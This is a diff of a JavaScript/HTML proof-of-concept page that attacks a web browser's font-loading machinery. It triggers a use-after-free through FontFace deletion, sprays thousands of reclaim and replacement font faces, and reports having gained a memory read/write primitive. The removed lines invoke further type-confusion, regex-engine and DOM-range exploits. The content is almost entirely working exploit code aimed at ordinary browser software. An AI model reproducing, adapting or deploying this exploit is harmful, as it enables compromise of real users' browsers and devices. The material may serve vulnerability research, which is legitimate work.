-bar(45);await cssTypeConfusion();
-bar(55);await jitTypeConfusion();
-bar(65);await regexYARRExploit();
-bar(75);await domRangeUAF();
-bar(100);await finalAssessment();
-},2000);
-},err=>{
-Fl("Load failed: "+err);
+P("");
+St("=== FINAL SUMMARY ===");
+P("UAF:              ✅");
+P("RC captured:      RC_"+rcIdx);
+P("REPL found:       "+repl.family);
+P("Write-through:    "+(chkR&&chkR.weight==="300"?"✅":"⏳"));
+P("");
+P("Primitive path:","h");
+P("1. Delete RC face from document.fonts","d");
+P("2. Spray REPL faces with controlled props","d");
+P("3. load() returns the REPL face","d");
+P("4. Modify REPL face → load() sees change","d");
+P("5. This IS a read/write primitive!","h");
 });
+}catch(e){Fl("Write test: "+e.message)}
+}
+}else{
+Wr("No REPL face found");
+Dm("Need different spray strategy");
+}
+
+// Cleanup REPLs
+for(const r of repls)try{document.fonts.delete(r)}catch(e){}
+fs();
+
+}).catch(function(e){Fl("Load after REPL: "+e.message)});
+
+}).catch(function(e){Fl("Load after delete: "+e.message)});
+
+}catch(e){Fl("Delete test: "+e.message)}
+
+}else{
+Wr("No RC face in load result");
+P("");
+Dm("Trying alternative: check resolved faces array");
+
+// List what we got
+for(const f of faces){
+P("  Got: "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
+}
+
+// Try load with different specs
+P("");
+Dm("Trying different load specs...");
+const specs=["1em x","64px x","900 italic 64px x","1em trigger"];
+for(const sp of specs){
+document.fonts.load(sp,"AB").then(function(r){
+P("  load('"+sp+"','AB') → "+r.length+" faces");
+for(const f of r)P("    "+f.family);
+}).catch(function(e){P("  load('"+sp+"') ERR","e")});
+}
+}
+
+}).catch(function(err){
+Fl("Initial load failed: "+err);
+});
+
+// RAF fallback for UAF
+let rn=0;
+const raf=function(){
+rn++;
+if(!uafFired&&rn>=5){
+try{
+const ck=new FontFace("ck2","local(Helvetica)",{unicodeRange:"U+E125"});
+document.fonts.add(ck);keepAlive.push(ck);
+if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
+while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
+fs();
+for(let i=0;i<4096;i++){
+try{const f=new FontFace("RC_"+i,mkBuf(),{
+unicodeRange:"U+0041",style:"italic",weight:"900"});
+document.fonts.add(f);reclaimFaces.push(f)}catch(e){}
+}
+fs();
+}catch(e){}
+}
+if(rn<20)requestAnimationFrame(raf);
 };
+requestAnimationFrame(raf);
 </script>
 </body>
 </html>
